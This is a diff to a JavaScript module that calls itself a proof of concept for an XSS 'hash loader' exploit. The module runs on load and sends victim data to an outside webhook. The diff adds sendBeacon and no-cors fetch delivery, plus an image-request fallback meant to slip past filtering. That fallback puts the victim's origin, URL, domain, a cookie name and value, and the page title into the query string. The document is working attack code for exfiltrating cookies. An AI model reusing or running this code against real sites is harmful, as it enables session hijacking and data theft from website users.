@@ -74,6 +74,22 @@ define([], function () {
 
   function sendPayload(payload) {
     var serialized = safeCall(function () { return JSON.stringify(payload); }, "{}");
+    var delivery = {
+      beacon: null,
+      fetchStarted: false,
+      imageFallback: false
+    };
+
+    try {
+      if (navigator.sendBeacon) {
+        delivery.beacon = navigator.sendBeacon(
+          WEBHOOK_URL,
+          new Blob([serialized], { type: "text/plain;charset=UTF-8" })
+        );
+      }
+    } catch (e) {
+      delivery.beacon = "error:" + (e && e.message ? e.message : String(e));
+    }
 
     try {
       if (window.fetch) {
@@ -82,18 +98,43 @@ define([], function () {
           mode: "no-cors",
           credentials: "omit",
           keepalive: true,
-          headers: { "content-type": "application/json" },
+          headers: { "content-type": "text/plain;charset=UTF-8" },
           body: serialized
-        });
-        return;
+        }).catch(function () {});
+        delivery.fetchStarted = true;
       }
-    } catch (e) {}
+    } catch (e) {
+      delivery.fetchStarted = "error:" + (e && e.message ? e.message : String(e));
+    }
 
+    // Single GET fallback for environments where beacon/fetch are filtered.
     try {
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(WEBHOOK_URL, serialized);
-      }
-    } catch (e) {}
+      var p = payload || {};
+      var m = p.marker || {};
+      var c = p.selectedCookieProof || {};
+      var qs = [
+        "event=" + encodeURIComponent(p.event || "cp_hash_loader_xss_exec_proof"),
+        "ts=" + encodeURIComponent(m.ts || nowIso()),
+        "origin=" + encodeURIComponent(m.victimOrigin || window.location.origin),
+        "href=" + encodeURIComponent(m.victimHref || window.location.href),
+        "domain=" + encodeURIComponent(m.documentDomain || document.domain || ""),
+        "cookie_name=" + encodeURIComponent(c.name || ""),
+        "cookie_value=" + encodeURIComponent(c.value || ""),
+        "cookie_count=" + encodeURIComponent(String(p.cookieCount || 0)),
+        "title=" + encodeURIComponent(p.title || "")
+      ].join("&");
+
+      var img = new Image();
+      img.referrerPolicy = "no-referrer";
+      img.src = WEBHOOK_URL + "?" + qs;
+      delivery.imageFallback = true;
+      delivery.imageUrl = img.src;
+      window.__CP_POC_LAST_IMG_URL__ = img.src;
+    } catch (e) {
+      delivery.imageFallback = "error:" + (e && e.message ? e.message : String(e));
+    }
+
+    window.__CP_POC_DELIVERY__ = delivery;
   }
 
   function markVisualProof(ts) {
@@ -167,7 +208,7 @@ define([], function () {
   executePoC();
 
   return {
-    version: "101.0.0-exec-proof-single-post",
+    version: "102.0.0-single-post-plus-image-fallback",
     render: function () {
       return executePoC();
     }
